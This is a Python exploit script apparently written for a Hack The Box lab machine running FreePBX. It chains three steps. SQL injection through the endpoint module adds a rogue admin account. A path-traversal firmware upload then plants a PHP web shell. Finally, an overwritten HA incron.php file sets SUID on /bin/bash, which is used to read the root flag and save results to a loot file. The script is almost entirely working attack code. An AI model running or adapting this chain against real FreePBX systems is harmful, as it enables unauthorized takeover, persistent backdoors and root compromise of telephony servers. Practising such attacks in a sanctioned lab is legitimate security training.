#!/usr/bin/env python3
import base64, hashlib, pathlib, random, string, requests, urllib3
urllib3.disable_warnings()
BASE = "http://connected.htb"
LOOT = pathlib.Path("/home/kali/Desktop/htb/Connected/loot/ha-trigger-suid.log")
def rnd(n=8): return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))
def hx(t): return "0x" + t.encode().hex()
def get_shell():
    s = requests.Session(); s.verify = False
    user, pw = "svc_" + rnd(5), rnd(12)
    sha1 = hashlib.sha1(pw.encode()).hexdigest()
    shell_dir, shell_name = rnd(10), rnd(8) + ".php"
    webshell = b'<?php if(isset($_REQUEST["cmd"])){echo "___OUT___";system($_REQUEST["cmd"]);echo "___END___";} ?>'
    def sqli(pl):
        s.get(f"{BASE}/admin/ajax.php", params={"module": r"FreePBX\modules\endpoint\ajax","command": "model","template": "x","model": "model","brand": pl}, timeout=120)
    sqli(f"x'; DELETE FROM asterisk.ampusers WHERE username={hx(user)}-- -")
    sqli("x'; INSERT INTO asterisk.ampusers (username,password_sha1,sections) VALUES ("+hx(user)+","+hx(sha1)+",0x2a)-- -")
    s.get(f"{BASE}/admin/config.php", timeout=120)
    s.post(f"{BASE}/admin/config.php", data={"username": user, "password": pw}, timeout=120)
    files = {"dzuuid":(None,"48069f49-c03e-4182-81f7-48e36622e0d3"),"dzchunkindex":(None,"0"),"dztotalfilesize":(None,str(len(webshell))),"dzchunksize":(None,"2000000"),"dztotalchunkcount":(None,"1"),"dzchunkbyteoffset":(None,"0"),"fwbrand":(None,f"../../../var/www/html/{shell_dir}"),"fwmodel":(None,"1"),"fwversion":(None,"1"),"file":(shell_name, webshell, "application/x-php")}
    s.post(f"{BASE}/admin/ajax.php?module=endpoint&command=upload_cust_fw", files=files, headers={"Referer": f"{BASE}/admin/config.php?display=epm_advanced","X-Requested-With": "XMLHttpRequest"}, timeout=120)
    url = f"{BASE}/{shell_dir}/{shell_name}"
    def cmd(c, timeout=180):
        r = s.get(url, params={"cmd": c}, timeout=timeout)
        return r.text.split("___OUT___",1)[1].split("___END___",1)[0].strip() if "___OUT___" in r.text else r.text[:12000]
    return cmd, url
PAYLOAD = b"""<?php
class incron {
  public function rootTrigger() {
    @chmod('/bin/bash', 04755);
    @file_put_contents('/tmp/ha_suid_done', date('c')."\\n", FILE_APPEND);
  }
}
"""
def main():
    cmd, url = get_shell()
    lines = [f"shell={url}"]
    lines.append(cmd("head -25 /usr/sbin/sysadmin_ha; ls -la /usr/local/asterisk/ha_trigger; ls -la /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php; find /var/www/html/admin/modules/freepbx_ha -writable 2>/dev/null; head -40 /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php"))
    b64 = base64.b64encode(PAYLOAD).decode()
    inc = "/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php"
    sh = f"test -f {inc}.bak_htb || cp -a {inc} {inc}.bak_htb; python -c \"import base64; open('{inc}','wb').write(base64.b64decode('{b64}'))\"; touch /usr/local/asterisk/ha_trigger; sleep 6; ls -la /bin/bash /tmp/ha_suid_done; find / -perm -4000 -name bash 2>/dev/null"
    lines.append(cmd(sh, 240))
    lines.append(cmd("/bin/bash -p -c 'id; cat /root/root.txt' 2>&1") if "rws" in lines[-1] or "4755" in lines[-1] else "(no suid yet)")
    text = "\n".join(lines)
    LOOT.write_text(text)
    print(text)
if __name__ == "__main__": main()
